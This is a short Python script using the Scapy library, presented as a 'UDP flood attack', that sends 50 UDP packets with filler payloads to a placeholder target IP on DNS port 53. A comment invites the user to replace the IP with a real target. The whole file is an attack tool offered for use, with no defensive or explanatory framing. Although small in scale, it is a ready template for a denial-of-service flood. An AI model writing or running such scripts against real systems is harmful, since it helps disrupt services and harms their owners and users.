from scapy.all import *

target_ip = "192.168.1.2"  # Replace with target IP
port = 53  # Targeting DNS port

print(f"Starting UDP flood on {target_ip}...")

for _ in range(50):  # Send 50 UDP packets
    packet = IP(dst=target_ip)/UDP(dport=port)/Raw(load="A"*50)
    send(packet, verbose=False)

print("UDP flood attack completed.")
